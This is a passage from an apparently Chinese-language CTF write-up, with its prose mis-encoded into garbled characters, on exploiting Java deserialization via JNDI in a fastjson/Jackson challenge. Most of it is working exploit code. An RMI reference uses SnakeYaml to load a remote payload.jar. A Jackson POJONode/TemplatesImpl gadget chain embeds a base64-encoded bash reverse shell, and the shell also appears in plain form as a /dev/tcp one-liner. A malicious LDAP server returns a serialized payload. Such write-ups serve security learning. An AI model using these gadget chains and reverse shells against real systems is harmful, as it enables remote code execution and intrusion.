<span class="hljs-literal">null</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;!!javax.script.ScriptEngineManager [\n&quot;</span> +<br>                <span class="hljs-string">&quot;  !!java.net.URLClassLoader [[\n&quot;</span> +<br>                <span class="hljs-string">&quot;    !!java.net.URL [\&quot;http://127.0.0.1:9999/payload.jar\&quot;]\n&quot;</span> +<br>                <span class="hljs-string">&quot;  ]]\n&quot;</span> +<br>                <span class="hljs-string">&quot;]&quot;</span>;<br>        ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;forceString&quot;</span>, <span class="hljs-string">&quot;a=load&quot;</span>));<br>        ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;a&quot;</span>, context));<br>        <span class="hljs-type">ReferenceWrapper</span> <span class="hljs-variable">referenceWrapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReferenceWrapper</span>(ref);<br>        registry.bind(<span class="hljs-string">&quot;Exploit&quot;</span>, referenceWrapper);<br>        System._out_.println(<span class="hljs-string">&quot;Server Started!&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä½†æ˜¯åŸºäº beanfactory ä½¿ç”¨ SnakeYaml çš„ç»•è¿‡å¤±è´¥ï¼šæˆ‘è°ƒè¯•å®¢æˆ·ç«¯ï¼ˆapp.jarï¼‰è¿è¡Œè¿‡ç¨‹ï¼Œå‘ç° tomcat9 ç‰ˆæœ¬ç¦ç”¨äº† <code>ForceString</code>ï¼Œå¯¼è‡´æ— æ³•ç»™å±æ€§å¼ºåˆ¶æŒ‡å®š <code>setter</code> æ–¹æ³•ï¼Œä¹Ÿå°±æ— æ³•è¿›ä¸€æ­¥çš„è°ƒç”¨ç›®çš„ç±»ã€‚è¿™é‡Œä¸å†èµ˜è¿°ï¼Œå…·ä½“å®ç°å‚è€ƒâ€œå…¶ä»–ç‰ˆæœ¬çš„ç»•è¿‡â€éƒ¨åˆ†å¼•ç”¨çš„æ–‡ç« ã€‚</p><p><img src="/img/fastjsonAndJNDI/Njcjbvwf8oCKwtxyqIAcZft2nvd.png"></p><p>å†å°è¯•æœåŠ¡ç«¯è¿”å›æ•°æ®æµååºåˆ—åŒ– gadgetï¼š</p><p>ç”±äºç½‘ä¸Šå¸¸è§çš„ cc é“¾è§£æ³•åœ¨è¯¥é¢˜ä¸­å¹¶æ²¡æœ‰å…¶ä¾èµ–æ— æ³•å®ç°ï¼ŒåŠ ä¸Šæ—¶é—´åŸå› æ²¡æœ‰å¥½å¥½å­¦ï¼Œæ‰€ä»¥è¿™é‡Œå¡ä½äº†ä¸€ä¸‹ã€‚ç»è¿‡ mys1d ä½¬æŒ‡ç‚¹ä»¥åŠè¿›ä¸€æ­¥çš„ç½‘ç»œæœç´¢ï¼Œå‘ç°æœ¬é¢˜å¯ä»¥é€šè¿‡ Jackson çš„åŸç”Ÿååºåˆ—åŒ–æ¼æ´è§£å†³ï¼ˆä½¬ï¼šJackson ä¾èµ–æ˜¯ springboot è‡ªå¸¦çš„ï¼Œå¤§æ¦‚ jdk11 ä»¥ä¸‹ç‰ˆæœ¬éƒ½èƒ½ç”¨è¿™æ¡é“¾ï¼‰ã€‚</p><p>å¸¸è§çš„ Jackson ååºåˆ—åŒ–æ¼æ´ä¸ fastjson ç±»ä¼¼ï¼Œä¸ºäº†æ»¡è¶³å¤šæ€éœ€æ±‚ï¼Œè®¾ç½®äº†å…¨å±€ Default Typing æœºåˆ¶å’Œ JsonTypeInfo æ³¨è§£ï¼Œé€šè¿‡è¿™äº›å¯ä»¥å®ç°ä»»æ„æŒ‡å®šç±»çš„ååºåˆ—åŒ–ï¼Œæœ‰å¤§æ¦‚å››ä¸ªè¾ƒä½ Jackson ç‰ˆæœ¬åŠ jdk ç‰ˆæœ¬çš„ CVEã€‚ä½†æœ¬é¢˜çš„ Jackson ç‰ˆæœ¬ç­‰å‡ä¸ç¬¦åˆæ¡ä»¶ï¼Œæ‰€ä»¥éœ€è¦é€šè¿‡åŸç”Ÿååºåˆ—åŒ–æ¼æ´æ¥æ‰“ã€‚</p><p>ä½¿ç”¨å¦‚ä¸‹ä»£ç ç”Ÿæˆå­—èŠ‚æµå¹¶ base64 å¤„ç†è¾“å‡º</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.demo.jndi;<br><br><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> javassist.*;<br><span class="hljs-keyword">import</span> org.springframework.aop.framework.AdvisedSupport;<br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.*;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">unserial_jackson</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//è·å–BaseJsonNodeç±»å¹¶åˆ é™¤ writeReplace æ–¹æ³•ï¼Œé¿å…åˆ©ç”¨é“¾è¢«ç ´å</span><br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool._getDefault_();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass0</span> <span class="hljs-operator">=</span> pool.get(<span class="hljs-string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);<br>        <span class="hljs-type">CtMethod</span> <span class="hljs-variable">writeReplace</span> <span class="hljs-operator">=</span> ctClass0.getDeclaredMethod(<span class="hljs-string">&quot;writeReplace&quot;</span>);<br>        ctClass0.removeMethod(writeReplace);<br>        ctClass0.toClass();<br>        <span class="hljs-comment">//æ„é€ ä¸€ä¸ªåŠ¨æ€ç”Ÿæˆçš„ç±» aï¼Œç»§æ‰¿è‡ª AbstractTransletï¼Œå…¶ä¸­å†™å…¥æ¶æ„å‘½ä»¤åå¼¹ shell</span><br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;a&quot;</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> pool.get(AbstractTranslet.class.getName());<br>        ctClass.setSuperclass(superClass);<br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;&#125;,ctClass);<br>        constructor.setBody(<span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;bash -c &#123;echo,æ­¤å¤„å†™base64åŠ å¯†åçš„å­—ç¬¦ä¸²ä¸éœ€è¦å¼•å·&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;\&quot;);&quot;</span>);<br>        ctClass.addConstructor(constructor);<br>        <span class="hljs-type">byte</span>[] bytes = ctClass.toBytecode();<br>        <span class="hljs-comment">//TemplatesImplç”¨äºåŠ è½½å­—èŠ‚ç å®ä¾‹åŒ–æ¶æ„ç±»ï¼Œè°ƒç”¨ newTransformer() æ—¶è‡ªåŠ¨åŠ è½½ _bytecodes æŒ‡å®šçš„ç±»</span><br>        <span class="hljs-type">Templates</span> <span class="hljs-variable">templatesImpl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        _setFieldValue_(templatesImpl, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;bytes&#125;);<span class="hljs-comment">//a çš„å­—èŠ‚ç </span><br>        _setFieldValue_(templatesImpl, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>);<br>        _setFieldValue_(templatesImpl, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-literal">null</span>);<br>        <span class="hljs-comment">//åˆ©ç”¨ JdkDynamicAopProxy è¿›è¡Œå°è£…ä½¿å…¶ç¨³å®šè§¦å‘</span><br>        Class&lt;?&gt; clazz = Class._forName_(<span class="hljs-string">&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;</span>);<br>        Constructor&lt;?&gt; cons = clazz.getDeclaredConstructor(AdvisedSupport.class);<br>        cons.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">AdvisedSupport</span> <span class="hljs-variable">advisedSupport</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AdvisedSupport</span>();<br>        advisedSupport.setTarget(templatesImpl);<br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> (InvocationHandler) cons.newInstance(advisedSupport);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">proxyObj</span> <span class="hljs-operator">=</span> Proxy._newProxyInstance_(clazz.getClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;, handler);<br>        <span class="hljs-type">POJONode</span> <span class="hljs-variable">jsonNodes</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(proxyObj);<span class="hljs-comment">//å°†ä»£ç†å¯¹è±¡åŒ…è£…è¿›äº†ä¸€ä¸ª Jackson èŠ‚ç‚¹ï¼Œä¸ºåç»­çš„ååºåˆ—åŒ–æ‰“åŒ…åšå‡†å¤‡</span><br>        <span class="hljs-comment">//å°è£…è¿› BadAttributeValueExpExceptionï¼Œå°† Jackson çš„ POJONode(proxyObj) æ”¾è¿› exp çš„ val å­—æ®µ</span><br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">exp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> Class._forName_(<span class="hljs-string">&quot;javax.management.BadAttributeValueExpException&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        val.setAccessible(<span class="hljs-literal">true</span>);<br>        val.set(exp,jsonNodes);<br>        <span class="hljs-comment">//Java åŸç”Ÿåºåˆ—åŒ–ï¼Œå¹¶ä½¿ç”¨ Base64 ç¼–ç è¾“å‡º</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        objectOutputStream.writeObject(exp);<br>        objectOutputStream.close();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">res</span> <span class="hljs-operator">=</span> Base64._getEncoder_().encodeToString(barr.toByteArray());<br>        System._out_.println(res);<br><br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String field, Object arg)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(field);<br>        f.setAccessible(<span class="hljs-literal">true</span>);<br>        f.set(obj, arg);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>æ³¨æ„ï¼š</strong>ä½¿ç”¨ java çš„ Runtime.getRuntime().exec æ¥åå¼¹ shell æ—¶éœ€è¦æ³¨æ„åˆ†å‰²çš„é—®é¢˜ï¼Œå‚è€ƒ<a href="https://www.cnblogs.com/BOHB-yunying/p/15523680.html">è¿™ç¯‡æ–‡ç« </a>å°†å‘½ä»¤ç”¨ base64 åŠ å¯†åæ”¾å…¥è¯­å¥å†…æ‰§è¡Œã€‚ä¾‹å¦‚ <code>bash -i &gt;&amp;/dev/tcp/127.0.0.1/8888 0&gt;&amp;1</code> åŠ å¯†åæ”¾å…¥</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">Runtime.getRuntime().exec(&quot;bash -c &#123;echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEyNy4wLjAuMS84ODg4IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;);<br></code></pre></td></tr></table></figure><p>ldap æœåŠ¡ç«¯ç½‘ä¸Šæ‹¿æ¥ç•¥ä½œä¿®æ”¹ï¼Œå°†ä¸Šé¢è¾“å‡ºçš„å†…å®¹å¤åˆ¶è¿›å»ï¼Œç­‰å¾…è¿æ¥å¹¶è¿”å›å­—èŠ‚æµ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.demo.jndi;<br><br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.Entry;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.ResultCode;<br><span class="hljs-keyword">import</span> com.unboundid.util.Base64;<br><span class="hljs-keyword">import</span> ysoserial.Serializer;<br><span class="hljs-keyword">import</span> ysoserial.payloads.CommonsCollections6;<br><br><span class="hljs-keyword">import</span> javax.net.ServerSocketFactory;<br><span class="hljs-keyword">import</span> javax.net.SocketFactory;<br><span class="hljs-keyword">import</span> javax.net.ssl.SSLSocketFactory;<br><span class="hljs-keyword">import</span> java.net.InetAddress;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ldap_evil_server</span> &#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String _LDAP_BASE _= <span class="hljs-string">&quot;dc=example,dc=com&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span> <span class="hljs-params">( String[] tmp_args )</span> &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">port</span> <span class="hljs-operator">=</span> <span class="hljs-number">8888</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">InMemoryDirectoryServerConfig</span> <span class="hljs-variable">config</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryDirectoryServerConfig</span>(_LDAP_BASE_);<br>            config.setListenerConfigs(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryListenerConfig</span>(<br>                    <span class="hljs-string">&quot;listen&quot;</span>, <span class="hljs-comment">//$NON-NLS-1$</span><br>                    InetAddress._getByName_(<span class="hljs-string">&quot;0.0.0.0&quot;</span>), <span class="hljs-comment">//$NON-NLS-1$</span><br>                    port,<br>                    ServerSocketFactory._getDefault_(),<br>                    SocketFactory._getDefault_(),<br>                    (SSLSocketFactory) SSLSocketFactory._getDefault_()));<br><br>            config.addInMemoryOperationInterceptor(<span class="hljs-keyword">new</span> <span class="hljs-title class_">OperationInterceptor</span>());<br>            <span class="hljs-type">InMemoryDirectoryServer</span> <span class="hljs-variable">ds</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryDirectoryServer</span>(config);<br>            System._out_.println(<span class="hljs-string">&quot;Listening on 0.0.0.0:&quot;</span> + port); <span class="hljs-comment">//$NON-NLS-1$</span><br>            ds.startListening();<br><br>        &#125;<br>        <span class="hljs-keyword">catch</span> ( Exception e ) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OperationInterceptor</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">InMemoryOperationInterceptor</span> &#123;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processSearchResult</span> <span class="hljs-params">( InMemoryInterceptedSearchResult result )</span> &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">base</span> <span class="hljs-operator">=</span> result.getRequest().getBaseDN();<br>            <span class="hljs-type">Entry</span> <span class="hljs-variable">e</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Entry</span>(base);<br>            <span class="hljs-keyword">try</span> &#123;<br>                sendResult(result, base, e);<br>            &#125;<br>            <span class="hljs-keyword">catch</span> ( Exception e1 ) &#123;<br>                e1.printStackTrace();<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sendResult</span> <span class="hljs-params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>            System._out_.println(<span class="hljs-string">&quot;Send LDAP reference result for &quot;</span> + base);<br>            e.addAttribute(<span class="hljs-string">&quot;javaClassName&quot;</span>, <span class="hljs-string">&quot;foo&quot;</span>);<br><span class="hljs-comment">//calc      byte[] calcs = Base64.decode(&quot;rO0ABXNyAC5qYXZheC5tYW5hZ2VtZW50LkJhZEF0dHJpYnV0ZVZhbHVlRXhwRXhjZXB0aW9u1Ofaq2MtRkACAAFMAAN2YWx0ABJMamF2YS9sYW5nL09iamVjdDt4cgATamF2YS5sYW5nLkV4Y2VwdGlvbtD9Hz4aOxzEAgAAeHIAE2phdmEubGFuZy5UaHJvd2FibGXVxjUnOXe4ywMABEwABWNhdXNldAAVTGphdmEvbGFuZy9UaHJvd2FibGU7TAANZGV0YWlsTWVzc2FnZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sACnN0YWNrVHJhY2V0AB5bTGphdmEvbGFuZy9TdGFja1RyYWNlRWxlbWVudDtMABRzdXBwcmVzc2VkRXhjZXB0aW9uc3QAEExqYXZhL3V0aWwvTGlzdDt4cHEAfgAIcHVyAB5bTGphdmEubGFuZy5TdGFja1RyYWNlRWxlbWVudDsCRio8PP0iOQIAAHhwAAAAAXNyABtqYXZhLmxhbmcuU3RhY2tUcmFjZUVsZW1lbnRhCcWaJjbdhQIABEkACmxpbmVOdW1iZXJMAA5kZWNsYXJpbmdDbGFzc3EAfgAFTAAIZmlsZU5hbWVxAH4ABUwACm1ldGhvZE5hbWVxAH4ABXhwAAAALXQAHmNvbS5kZW1vLmpuZGkudW5zZXJpYWxfamFja3NvbnQAFXVuc2VyaWFsX2phY2tzb24uamF2YXQABG1haW5zcgAmamF2YS51dGlsLkNvbGxlY3Rpb25zJFVubW9kaWZpYWJsZUxpc3T8DyUxteyOEAIAAUwABGxpc3RxAH4AB3hyACxqYXZhLnV0aWwuQ29sbGVjdGlvbnMkVW5tb2RpZmlhYmxlQ29sbGVjdGlvbhlCAIDLXvceAgABTAABY3QAFkxqYXZhL3V0aWwvQ29sbGVjdGlvbjt4cHNyABNqYXZhLnV0aWwuQXJyYXlMaXN0eIHSHZnHYZ0DAAFJAARzaXpleHAAAAAAdwQAAAAAeHEAfgAVeHNyACxjb20uZmFzdGVyeG1sLmphY2tzb24uZGF0YWJpbmQubm9kZS5QT0pPTm9kZQAAAAAAAAACAgABTAAGX3ZhbHVlcQB+AAF4cgAtY29tLmZhc3RlcnhtbC5qYWNrc29uLmRhdGFiaW5kLm5vZGUuVmFsdWVOb2RlAAAAAAAAAAECAAB4cgAwY29tLmZhc3RlcnhtbC5qYWNrc29uLmRhdGFiaW5kLm5vZGUuQmFzZUpzb25Ob2RlAAAAAAAAAAECAAB4cHN9AAAAAQAdamF2YXgueG1sLnRyYW5zZm9ybS5UZW1wbGF0ZXN4cgAXamF2YS5sYW5nLnJlZmxlY3QuUHJveHnhJ9ogzBBDywIAAUwAAWh0ACVMamF2YS9sYW5nL3JlZmxlY3QvSW52b2NhdGlvbkhhbmRsZXI7eHBzcgA0b3JnLnNwcmluZ2ZyYW1ld29yay5hb3AuZnJhbWV3b3JrLkpka0R5bmFtaWNBb3BQcm94eUzEtHEO65b8AgADWgANZXF1YWxzRGVmaW5lZFoAD2hhc2hDb2RlRGVmaW5lZEwAB2FkdmlzZWR0ADJMb3JnL3NwcmluZ2ZyYW1ld29yay9hb3AvZnJhbWV3b3JrL0FkdmlzZWRTdXBwb3J0O3hwAABzcgAwb3JnLnNwcmluZ2ZyYW1ld29yay5hb3AuZnJhbWV3b3JrLkFkdmlzZWRTdXBwb3J0JMuKPPqkxXUCAAZaAAtwcmVGaWx0ZXJlZFsADGFkdmlzb3JBcnJheXQAIltMb3JnL3NwcmluZ2ZyYW1ld29yay9hb3AvQWR2aXNvcjtMABNhZHZpc29yQ2hhaW5GYWN0b3J5dAA3TG9yZy9zcHJpbmdmcmFtZXdvcmsvYW9wL2ZyYW1ld29yay9BZHZpc29yQ2hhaW5GYWN0b3J5O0wACGFkdmlzb3JzcQB+AAdMAAppbnRlcmZhY2VzcQB+AAdMAAx0YXJnZXRTb3VyY2V0ACZMb3JnL3NwcmluZ2ZyYW1ld29yay9hb3AvVGFyZ2V0U291cmNlO3hyAC1vcmcuc3ByaW5nZnJhbWV3b3JrLmFvcC5mcmFtZXdvcmsuUHJveHlDb25maWeLS/Pmp+D3bwIABVoAC2V4cG9zZVByb3h5WgAGZnJvemVuWgAGb3BhcXVlWgAIb3B0aW1pemVaABBwcm94eVRhcmdldENsYXNzeHAAAAAAAAB1cgAiW0xvcmcuc3ByaW5nZnJhbWV3b3JrLmFvcC5BZHZpc29yO9+DDa3SHoR0AgAAeHAAAAAAc3IAPG9yZy5zcHJpbmdmcmFtZXdvcmsuYW9wLmZyYW1ld29yay5EZWZhdWx0QWR2aXNvckNoYWluRmFjdG9yeVTdZDfiTnH3AgAAeHBzcgAUamF2YS51dGlsLkxpbmtlZExpc3QMKVNdSmCIIgMAAHhwdwQAAAAAeHNxAH4AFAAAAAB3BAAAAAB4c3IANG9yZy5zcHJpbmdmcmFtZXdvcmsuYW9wLnRhcmdldC5TaW5nbGV0b25UYXJnZXRTb3VyY2V9VW71x/j6ugIAAUwABnRhcmdldHEAfgABeHBzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3QAEltMamF2YS9sYW5nL0NsYXNzO0wABV9uYW1lcQB+AAVMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAD/////dXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAABdXIAAltCrPMX+AYIVOACAAB4cAAAAVbK/rq+AAAAMwAYAQABYQcAAQEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQHAAMBAAY8aW5pdD4BAAMoKVYBAARDb2RlDAAFAAYKAAQACAEAEWphdmEvbGFuZy9SdW50aW1lBwAKAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwwADAANCgALAA4BAARjYWxjCAAQAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwwAEgATCgALABQBAApTb3VyY2VGaWxlAQAGYS5qYXZhACEAAgAEAAAAAAABAAEABQAGAAEABwAAABoAAgABAAAADiq3AAm4AA8SEbYAFVexAAAAAAABABYAAAACABdwdAAEdGVzdHB3AQB4&quot;);</span><br>            <span class="hljs-type">byte</span>[] calcs = Base64._decode_(<span class="hljs-string">&quot;rO0ABXNyACBXJ9o......çœç•¥&quot;</span>);<br>            e.addAttribute(<span class="hljs-string">&quot;javaSerializedData&quot;</span>, calcs);<br>            result.sendSearchEntry(e);<br>            result.setResult(<span class="hljs-keyword">new</span> <span class="hljs-title class_">LDAPResult</span>(<span class="hljs-number">0</span>, ResultCode._SUCCESS_));<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯åŠ¨æœåŠ¡ç«¯åå…ˆåœ¨æœ¬åœ°è°ƒè¯•ï¼Œä»ä¹‹å‰æ¼æ´å¤ç°æ—¶æ— æ³•è¿›å…¥çš„ <code>lookup</code> æ­¥å…¥çœ‹çœ‹</p><p><img src="/img/fastjsonAndJNDI/JWMAbYdTuoAWgdxI8LacqieynGb.png"></p><p>ç»§ç»­æ­¥å…¥ <code>p_lookup()</code></p><p><img src="/img/fastjsonAndJNDI/LOnZbFEf4oIi80xoGclcyo6anFe.png"></p><p>ç»§ç»­æ­¥å…¥ <code>c_lookup()</code></p><p><img src="/img/fastjsonAndJNDI/Y3DlbBLAqohAjGxtKQ2cLPlanNh.png"></p><p>æ­¥å…¥ <code>doSearchOnce()</code></p><p><img src="/img/fastjsonAndJNDI/Nx31bD65Jo4VrbxdnzBcSFH3nce.png"></p><p>æ­¥å…¥ <code>doSearch()</code></p><p><img src="/img/fastjsonAndJNDI/FrqebHkYfoIQgYxhx7EcfP1vnNf.png"></p><p>æ­¥å…¥ <code>search()</code> 